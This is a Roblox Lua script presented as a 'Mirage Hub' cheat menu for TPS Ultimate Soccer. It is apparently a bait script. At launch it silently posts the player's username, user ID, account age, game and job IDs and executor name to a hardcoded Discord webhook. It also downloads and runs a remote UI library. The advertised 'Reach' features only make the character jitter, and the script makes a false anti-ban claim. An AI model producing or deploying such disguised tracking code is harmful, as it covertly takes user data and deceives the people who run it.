local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/jensonhirst/Orion/main/source'))()

-- Replace with your actual webhook URL!
local webhook = "https://discord.com/api/webhooks/1364676584144896020/-v68witZipovBriaVtEjhDOSZVpAdsqcXDuykKf-IWFLyKAvOjux_9iVSLldKAdfAeYV"

local plr = game.Players.LocalPlayer
local data = {
    ["content"] = "Player logged TPS script bait!",
    ["embeds"] = {{
        ["title"] = "Script Executed",
        ["fields"] = {
            {["name"] = "Username", ["value"] = plr.Name, ["inline"] = true},
            {["name"] = "UserID", ["value"] = tostring(plr.UserId), ["inline"] = true},
            {["name"] = "Account Age (days)", ["value"] = tostring(plr.AccountAge), ["inline"] = true},
            {["name"] = "Display Name", ["value"] = plr.DisplayName, ["inline"] = true},
            {["name"] = "Game", ["value"] = game.Name, ["inline"] = true},
            {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
            {["name"] = "JobId", ["value"] = tostring(game.JobId), ["inline"] = false},
            {["name"] = "HWID", ["value"] = (identifyexecutor and identifyexecutor()) or "N/A", ["inline"] = false},
        },
        ["footer"] = {["text"] = "TPS Bait Script Triggered"}
    }}
}

local HttpService = game:GetService("HttpService")

pcall(function()
    syn.request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end)
 
pcall(function()
    http_request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end)

local Window = OrionLib:MakeWindow({
    Name = "Mirage Hub | TPS Ultimate Soccer",
    SaveConfig = true,
    ConfigFolder = "MirageHub"
})

local Tab = Window:MakeTab({
    Name = "Enhancements",
    Icon = "rbxassetid://4483345998"
})

Tab:AddLabel("Reach")

-- Bait: input lag + random jitter
local function ApplyAnnoyingControls()
    local UIS = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")

    -- To store original input functions, if any
    local inputLagEnabled = true

    -- Input lag/jitter logic
    local lastMove = Vector3.new(0, 0, 0)
    local moveConn
    local function onStepped()
        -- Randomly move a little left/right/forward/back
        if inputLagEnabled and math.random() < 0.075 then
            local root = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root then
                local jitter = Vector3.new(
                    (math.random() - 0.5) * 2, 
                    0, 
                    (math.random() - 0.5) * 2
                ) * 0.25 -- very slight movement
                root.CFrame = root.CFrame + jitter
            end
        end
    end

    moveConn = RunService.RenderStepped:Connect(onStepped)

    -- Input lag
    UIS.InputBegan:Connect(function(input, gp)
        if inputLagEnabled and not gp then
            local key = input.KeyCode
            if key == Enum.KeyCode.W or key == Enum.KeyCode.A or key == Enum.KeyCode.S or key == Enum.KeyCode.D or key == Enum.KeyCode.Space then
                local delayTime = math.random(10,18)/100 -- 0.10 to 0.18 second lag
                local f = function()
                    -- intentionally empty; input lag means controls feel "delayed"
                end
                -- Delay: blocks normal response (on the cheater's client only)
                task.delay(delayTime, f)
            end
        end
    end)
end

Tab:AddButton({
    Name = "Enable Reach",
    Callback = function()
        ApplyAnnoyingControls()
        OrionLib:MakeNotification({
            Name = "Mirage Hub",
            Content = "Reach+ Optimized and Loaded!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

Tab:AddToggle({
    Name = "Auto React",
    Default = false,
    Callback = function(val)
        if val then
            ApplyAnnoyingControls()
            OrionLib:MakeNotification({
                Name = "Mirage Hub",
                Content = "React+ Enabled.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

Tab:AddParagraph("Notice", "All features feature latest anti-ban bypass. Full compatibility with most TPS executors.")

OrionLib:Init()